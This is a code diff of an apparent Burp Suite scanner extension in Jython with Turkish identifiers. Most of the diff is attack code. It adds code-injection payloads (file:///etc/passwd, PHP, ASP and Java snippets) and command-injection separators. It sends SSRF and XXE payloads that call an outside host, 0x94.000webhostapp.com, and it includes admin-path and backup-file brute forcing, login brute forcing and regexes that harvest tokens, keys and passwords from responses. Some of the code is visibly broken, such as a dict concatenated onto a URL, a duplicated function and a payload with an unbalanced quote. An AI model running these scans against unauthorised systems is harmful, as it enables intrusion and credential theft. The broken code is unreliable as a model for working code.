@@ -40,6 +40,7 @@ from java.awt.event import ActionListener
 from javax.swing import RowFilter
 from java.awt.event import ItemListener
 from javax.swing.table import TableRowSorter
+
 from java.net import URL
 from thread import start_new_thread
 from urlparse import parse_qs
@@ -137,6 +138,9 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	return None
 
 
+   
+    
+
     def brute_file(self,url):
 	protocol = urlparse.urlparse(url).scheme + "://"
 	dizin = url
@@ -151,161 +155,17 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		dizin = protocol + url.rsplit("/")[2] + "/" + url.rsplit("/")[3] + "/" + url.rsplit("/")[4] + "/" + \
 				    url.rsplit("/")[5] + "/"
 
-	bflist =[
-		    "/admin",
-		"/admin.asp",
-	    "/admin.aspx",
-	    "/admin.cfm",
-	    "/admin.cgi",
-	    "/admin.do",
-	    "/admin.htm",
-	    "/admin.py",
-	    "/sadmin",
-	    "/cmsadmin",
-	    "/admin.db",
-	    "/admin.ctp",
-	    "/admin.ini",
-	    "/admin.tpl",
-	    "/admin.xml",
-	    "/admin.html",
-	    "/admin.jsp",
-	    "/admin.php",
-	    "/admin.php3",
-	    "/admin2",
-	    "/admin_",
-	    "/admin_login",
-	    "/admin_logon",
-	    "/administracion",
-	    "/administrador",
-	    "/administrateur",
-	    "/administration",
-	    "/administrator",
-	    "/administrator",
-	    "/adminlogon",
-	    "/authadmin",
-	    "/backend",
-	    "/console",
-	    "/fpadmin",
-	    "/iisadmin",
-	    "/manage",
-	    "/manager",
-	    "/phpmyadmin",
-	    "/portal",
-	    "/siteadmin",
-	    "/staff",
-	    "/user",
-	    "/users",
-	    "/usuario",
-	    "/usuarios",
-	    "/webadmin",
-	    "/wp-admin",
-	    "/~admin",
-	    "/_admin",
-	    "/admin2.php",
-	    "/admin.html",
-	    "/admins.php",
-	    "/admin.php3",
-	    "/admin.aspx",
-	    "/_admin.php",
-	    "/admin1.php",
-	    "/phpinfo.php",
-	    "/PhpInfo.php",
-	    "/PHPinfo.php",
-	    "/PHPINFO.php",
-	    "/phpInfo.php",
-	    "/info.php",
-	    "/Info.php",
-	    "/INFO.php",
-	    "/test.php",
-	    "/install.php",
-	    "/INSTALL.php",
-	    "/admin.php",
-	    "/phpversion.php",
-	    "/phpVersion.php",
-	    "/test1.php",
-	    "/test.php",
-	    "/test2.php",
-	    "/phpinfo1.php",
-	    "/phpInfo1.php",
-	    "/info1.php",
-	    "/PHPversion.php",
-	    "/x.php",
-	    "/xx.php",
-	    "/xxx.php",
-	    "/backup_2019.zip",
-	    "/backup_2019.tar.gz",
-	    "/backup.gz",
-	    "/backup.zip",
-	    "/api/proxy",
-	    "/swagger-ui",
-	    "/demo",
-	    "/metrics",
-	    "/java",
-	    "/dasbhoard/",
-	    "/solr",
-	    "/composer.json",
-	    "manifest.json",
-	    "/temp",
-	    "/data,"
-	    "/heapdump",
-	    "/codeception.yml",
-	    "/api/",
-	    "/download",
-	    "/readfile",
-	    "/test",
-	    "/testing",
-	    "/proxy",
-	    "/debug",
-	    "/backup",
-	    "/config",
-	    "/upload",
-	    "/.git",
-	    "/files",
-	    "/old",
-	    "/application.wadl",
-	    "/graph",
-	    "/.svn",
-	    "/dev",
-	    "/beans",
-	    "/env",
-	    "/secret",
-	    "/.secret",
-	    "index.php.swp",
-	    "/charts",
-	    "/script",
-	    "/jenkins/script",
-	    "/admen",
-	    "/charts/",
-	    "/swagger-ui",
-	    "/demo"
-	    "/out",
-	    "/version",
-	    "/_admin",
-	     "/server-status"
-	    "/CFIDE/",
-	    "/version.txt",
-	    "/FCKeditor/",
-	    "/flashservices/",
-	    "/CFFileServlet/",
-	    "/manager/",
-	    "/samples",
-	    "/error_log",
-	    "/cfusion/",
-	    "/dana-na/",
-	    "/autodiscover/autodiscover.xml",
-	    "/cf_scripts/",
-	    "/Providers/HtmlEditorProviders/Telerik/Telerik.Web.UI.DialogHandler.aspx",
-	    "/Microsoft-Server-ActiveSync/"]
+	
 
 	source404=self.page404(dizin)
 
-	for xx in bflist:
+	for xx in open("dict/files.txt").readlines():
 	    try:
 		urlac = session.get(dizin + xx)
 		response = urlac.text
 		data = dump.dump_all(urlac)
 		rawdata = data.decode('utf-8')
-		if urlac.status_code == 200:
+		if urlac.status_code == 200 or urlac.status_code == 300 or urlac.status_code == 500:
 		    if len(source404)!=len(response):
 			self.ekle("GET", dizin + xx, xx + " Brute File", dizin + xx, rawdata)
 	    except:
@@ -331,11 +191,8 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		  "/connect.php": "Access denied for",
 		     "/WS_FTP.LOG": "<--",
 		    "/index.bak": "<?PHP",
-		    "/index.bak": "<?",
 		     "/.idea/workspace.xml": "project version",
 		    ".htaccess": "RewriteEngine",
-		    ".travis.yml": "language",
-		      "/admin": "password",
 		    "/phpmyadmin":"phpMyAdmin</bdo>"}
 
 	for xx, yy in listem.iteritems():
@@ -351,6 +208,11 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		mesaj = "error"
 
 
+
+    def randomString(self,stringLength):
+	letters = string.ascii_lowercase
+	return ''.join(random.choice(letters) for i in range(stringLength))
+		
 
     def hatakontrol(self,method,url,response,urlnormal):
     
@@ -668,6 +530,10 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	if re.search("Invalid SQL statement or JDBC",response,re.DOTALL):
 	    mesaj= "[#] %s Apache Tomcat JDBC error" % urlnormal
 	    self.ekle(method,url,"SQL error", "",response)
+    
+	if re.search("fpassthru() expects parameter",response,re.DOTALL):
+	    mesaj= "[#] %s Php error" % urlnormal
+	    self.ekle(method,url,"Php error", "",response)    
     
 	if re.search("mysql_fetch_array() expects parameter",response,re.DOTALL):
 	    mesaj= "[#] %s MySQL Server error" % urlnormal
@@ -1041,6 +907,8 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 		self.ekle("GET",lfiurl,"Local File Include",urlnormal, rawdata)
 
+	    self.hatakontrol("GET",lfiurl,rawdata,lfiurl)
+
 	except:
 	    mesaj="Error"
 
@@ -1173,7 +1041,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
     def getcommandinj(self,url):
 
-	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";"]
+	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";",""]
 	cmdhal={}
 	command=["SET /A 0xFFF123-2","expr 12345671 - 2"]
 
@@ -1191,6 +1059,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		    if "12345669" in response  or "16773409" in response:
 			self.ekle("GET",url,"Command Injection",cmdhal, rawdata)
 
+		    self.hatakontrol("GET",url,rawdata,url)
 
 		except:
 		    mesaj="Error"
@@ -1200,7 +1069,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		
     def getcommandinj(self,url):
 
-	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";"]
+	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";",""]
 	cmdhal={}
 	command=["SET /A 0xFFF123-2","expr 12345671 - 2"]
 
@@ -1218,6 +1087,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		    if "12345669" in response  or "16773409" in response:
 			self.ekle("GET",url,"Command Injection",cmdhal, rawdata)
 
+		    self.hatakontrol("GET",url,rawdata,url)
 
 		except:
 		    mesaj="Error"
@@ -1227,20 +1097,19 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
     def ssrf_form(self,url,params,method):
 
-	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";","@","&","?@"]
+	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";","@","&","?@",""]
 	
 	
-	anahtar=randomString(19)
+	anahtar=self.randomString(19)
 	anahtar_ana="https://0x94.000webhostapp.com/0x94.php?"+anahtar
 	
 	
 	postgetdict={}
 	postgetdict=params.copy()
 
-	for framefull in frameler:
+	for framefull in seperators:
 	    for key,value in params.items():
 		if key in postgetdict:
-		    postgetdict={}
 		    postgetdict[key]=value+framefull+anahtar_ana
 		    new_param = {}
 		    new_param = postgetdict.copy()
@@ -1268,6 +1137,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			    if anahtar in bakbak:	
 				self.ekle(method,url,"POST SSRF Injection",str(new_param), rawdata)
 
+			self.hatakontrol("GET",url,rawdata,url)
 
 		    except:
 			mesaj="Bilinmeyen hata olustu\n"
@@ -1275,12 +1145,12 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		    postgetdict.clear()
 		    postgetdict = params.copy()
 
-    def ssrf_blind(self,gelenurl):
+    def ssrf_blind(self,url):
 
 	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";","@","&","?@"]
 	cmdhal={}
 
-	anahtar=randomString(19)
+	anahtar=self.randomString(19)
 	anahtar_ana="https://0x94.000webhostapp.com/0x94.php?"+anahtar
 	
 	for sep in seperators:
@@ -1297,6 +1167,8 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		
 		if anahtar in bakbak:
 		    self.ekle("GET",url,"URL SSRF Injection",cmdhal, rawdata)
+
+		self.hatakontrol("GET",url,rawdata,url)
 
 	    except:
 		mesaj="Error"
@@ -1774,7 +1646,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 	    for key,value in params.items():
 		if key in postgetdict:
-		    postgetdict={}
 		    postgetdict[key]=value+xssler
 		    new_param = {}
 		    new_param = postgetdict.copy()
@@ -1982,7 +1853,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	for rcefull in rceler:
 	    for key,value in params.items():
 		if key in postgetdict:
-		    postgetdict={}
 		    postgetdict[key]=value+rcefull
 		    new_param = {}
 		    new_param = postgetdict.copy()
@@ -2026,7 +1896,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	for framefull in frameler:
 	    for key,value in params.items():
 		if key in postgetdict:
-		    postgetdict={}
 		    postgetdict[key]=value+framefull
 		    new_param={}
 		    new_param=postgetdict.copy()
@@ -2062,9 +1931,61 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		    postgetdict.clear()
 		    postgetdict = params.copy()
 
+
+    def code_execute(self,url,params,method):
+	
+	randint1 = random.randint(10000, 90000)
+	randint2 = random.randint(10000, 90000)
+	randint3 = randint1 * randint2
+	    
+	aspcode='response.write({}*{})'.format(randint1, randint2)
+	
+	
+	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";","","${{"]
+	
+	
+	frameler = ["file:///etc/passwd","new java.io.File('cat etc/passwd').listFiles()",aspcode,"print(md5('doksandort'));","${{print(md5('doksandort'))}}","${{@print(md5('doksandort))}}\\"]
+
+	postgetdict={}
+	postgetdict=params.copy()
+
+	for sep in seperators:
+	    for framefull in frameler:
+		for key,value in params.items():
+		    if key in postgetdict:
+			postgetdict[key]=sep+framefull
+			new_param = {}
+			new_param = postgetdict.copy()
+			try:
+			    if method=="GET":
+				y11 = session.get(url+"?"+postgetdict)
+				postgetdict.clear()
+				postgetdict=params.copy()
+				data = dump.dump_all(y11)
+				rawdata = data.decode('utf-8')
+				if "root:x:0:0:root" in y11.text.lower() or str(randint3) in y11.text.lower() or "71e548764806bb158d656120fd28e54f" in y11.text.lower():
+				    self.ekle(method,url,"Code Injection",str(new_param), rawdata)
+    
+			    else:
+				y11 = session.post(url, postgetdict)
+				postgetdict.clear()
+				postgetdict=params.copy()
+				data = dump.dump_all(y11)
+				rawdata = data.decode('utf-8')
+				if "root:x:0:0:root" in y11.text.lower() or str(randint3) in y11.text.lower() or "71e548764806bb158d656120fd28e54f" in y11.text.lower():
+				    self.ekle(method,url,"Code Injection",str(new_param), rawdata)
+    
+    
+    
+			except:
+			    mesaj="Bilinmeyen hata olustu\n"
+    
+			postgetdict.clear()
+			postgetdict = params.copy()
+
     def templateinjection(self,url,params,method):
 
-	frameler = ["0x94{{17*17}}","{{17*17}}"]
+	frameler = ["0x94{{17*17}}","{{17*17}}","file:///etc/passwd"]
 
 	postgetdict={}
 	postgetdict=params.copy()
@@ -2072,7 +1993,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	for framefull in frameler:
 	    for key,value in params.items():
 		if key in postgetdict:
-		    postgetdict={}
 		    postgetdict[key]=value+framefull
 		    new_param = {}
 		    new_param = postgetdict.copy()
@@ -2083,10 +2003,8 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			    postgetdict=params.copy()
 			    data = dump.dump_all(y11)
 			    rawdata = data.decode('utf-8')
-			    if value+"289" in y11.text.lower():
+			    if value+"289" in y11.text.lower() or "root:x:0:0:root" in y11.text.lower():
 				self.ekle(method,url,"Template Injection",str(new_param), rawdata)
-
-
 
 			else:
 			    y11 = session.post(url, postgetdict)
@@ -2094,7 +2012,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			    postgetdict=params.copy()
 			    data = dump.dump_all(y11)
 			    rawdata = data.decode('utf-8')
-			    if value+"289" in y11.text.lower():
+			    if value+"289" in y11.text.lower() or "root:x:0:0:root" in y11.text.lower():
 				self.ekle(method,url,"Template Injection",str(new_param), rawdata)
 
 
@@ -2152,13 +2070,11 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 				    key.lower() == "id":
 				dictb1[key] = "0x94"
 
-		    parametrebrute1 = urllib.urlencode(dictb1)
 		    if method == "GET":
-			loginnormal = urlopen(url + "?" + parametrebrute1).read()
+			loginnormal = requests.get(url + "?" + dictb1).text
 
 		    else:
-
-			loginnormal = urlopen(url, parametrebrute1).read()
+			loginnormal = requests.post(url, dictb1).text
 
 		    for gelenuser in userlar:
 			dictlogin = {}
@@ -2183,14 +2099,13 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 					    key.lower() == "pwd":
 					dictlogin[key] = gelenpass.strip()
 
-			    loginsaf = urllib.urlencode(dictlogin)
 			    if method == "GET":
-				brutekaynak = urlopen(url + "?" + loginsaf).read()
+				brutekaynak = requests.get(url + "?" + dictlogin).text
 				dictlogin.clear()
 				dictlogin = params.copy()
 
 			    else:
-				brutekaynak = urlopen(url, loginsaf).read()
+				brutekaynak = requests.post(url, dictlogin).text
 				dictlogin.clear()
 				dictlogin = params.copy()
 				
@@ -2237,11 +2152,11 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 	rastgelekaptan = random.randint(0, 9999997)
 	
-	anahtar=randomString(19)
+	anahtar=self.randomString(19)
 	anahtar_ana="https://0x94.000webhostapp.com/0x94.php?"+anahtar
 	
 	
-	inject_key = '<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % ext SYSTEM "'+anahtar_ana+'"> %ext;]><r></r>'
+	inject_key = '<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % ext SYSTEM "'+anahtar_ana+'"> %ext;]><r></r>\n'
 
 	for rakam in range(3):
 	    if rakam==1:
@@ -2322,18 +2237,50 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		mesaj = "fff"
 
 
-    def randomString(stringLength):
-	"""Generate a random string of fixed length """
-	letters = string.ascii_lowercase
-	return ''.join(random.choice(letters) for i in range(stringLength))
 
+
+    def sensitive_contents(self,url,response):
+	regx = (
+	        r'\b(?:http:|https:)(?:[\w/\.]+)?(?:[a-zA-Z0-9_\-\.]{1,})\.(?:php|asp|ashx|jspx|aspx|jsp|json|action|txt|do)\b',
+	        r'\b(?:secret|secret_key|token|secret_token|auth_token|access_token|username|password|aws_access_key_id|aws_secret_access_key|secretkey|authtoken|accesstoken|access-token|authkey|client_secret|bucket|email|HEROKU_API_KEY|SF_USERNAME|PT_TOKEN|id_dsa|clientsecret|client-secret|encryption-key|pass|encryption_key|encryptionkey|secretkey|secret-key|bearer|JEKYLL_GITHUB_TOKEN|HOMEBREW_GITHUB_API_TOKEN|api_key|api_secret_key|api-key|private_key|client_key|client_id|sshkey|ssh_key|ssh-key|privatekey|DB_USERNAME|oauth_token|irc_pass|dbpasswd|xoxa-2|xoxrprivate-key|private_key|consumer_key|consumer_secret|access_token_secret|SLACK_BOT_TOKEN|slack_api_token|api_token|ConsumerKey|ConsumerSecret|SESSION_TOKEN|session_key|session_secret|slack_token|slack_secret_token|bot_access_token|passwd|api|eid|sid|api_key|apikey|userid|user_id|user-id)["\s]*(?::|=|=:|=>)["\s]*[a-z0-9A-Z]{8,64}"?',
+	        r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b',
+	        r'[\w]+\.cloudfront\.net',
+	        r'[\w\-.]+\.appspot\.com',
+	        r'[\w\-.]*s3[\w\-.]*\.?amazonaws\.com\/?[\w\-.]*',
+	        r'([\w\-.]*\.?digitaloceanspaces\.com\/?[\w\-.]*)',
+	        r'(storage\.cloud\.google\.com\/[\w\-.]+)',
+	        r'([\w\-.]*\.?storage.googleapis.com\/?[\w\-.]*)',
+	)	
+	for sensi in regx:
+	    texts = re.findall(sensi, response, re.M | re.I)
+	    if texts:
+		for ix in texts:
+		    self.ekle("GET", url, "Sensitive Content: "+ix, url + "\nContent Key=" + ix, response)
+		    
+
+    def sensitive_response(self,url,response):
+	
+	sensitive_params = ['"mail":', '"user":','"ip":', '"pass":', '"add":', '"phone":','"template":','"url":','"database":','"admin":','"root":']
+	for px in sensitive_params:
+	    if px in response:
+		self.ekle("GET", url, "Sensitive Content: "+px, url + "\n Sensitive Param=" + px, response)	
+
+
+    def sensitive_params(self,url):
+	sensitive_params = ['mail=', 'user=','ip=', 'pass=', 'add=', 'phone=']
+	for px in sensitive_params:
+	    if px in url:
+		self.ekle("GET", url, "Sensitive Params: "+px, url + "\n Sensitive Param=" + px, url)
+	    
+    
     def scan_starter(self,url):
 
 	try:
 
 	    if "?" not in url:
 		self.brute_file(url)
-
+		
+	    self.sensitive_params(url)    
 	    self.normalac(url)
 	    self.sefurl_xss(url)
 	    self.tumdizinlerde(url)
@@ -2375,6 +2322,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	    self.frameinjection(formurl, toplamveri,"GET")
 	    self.templateinjection(formurl, toplamveri,"GET")
 	    self.ssrf_form(formurl, toplamveri,"GET")
+	    self.code_execute(formurl,toplamveri,"GET")
 	    self.xxe_injection(formurl, toplamveri,"GET",body)
 	    self.xxe_error_injection(formurl, toplamveri,"GET",body)
 	    self.blind_xxe_injection(formurl, toplamveri,"GET",body)
@@ -2393,6 +2341,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	    self.frameinjection(formurl, toplamveri,"POST")
 	    self.templateinjection(formurl, toplamveri,"POST")
 	    self.ssrf_form(formurl, toplamveri,"POST")
+	    self.code_execute(formurl,toplamveri,"POST")
 	    self.xxe_injection(formurl, toplamveri,"POST",body)
 	    self.xxe_error_injection(formurl, toplamveri,"POST",body)
 	    self.blind_xxe_injection(formurl, toplamveri,"POST",body)
@@ -2413,7 +2362,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 	    self.table_add(method,java_URL,bug,payload,source)
 
-
+	    
 
     def table_add(self,method,url,bug,payload,source):
 
@@ -2551,6 +2500,9 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			    session.headers.update(headersm3)	
 			    
     
+		    self.sensitive_contents(url.toString(),response)
+		    self.sensitive_response(url.toString(),response)
+		    
 		    if method == "POST" :
 			try:
     
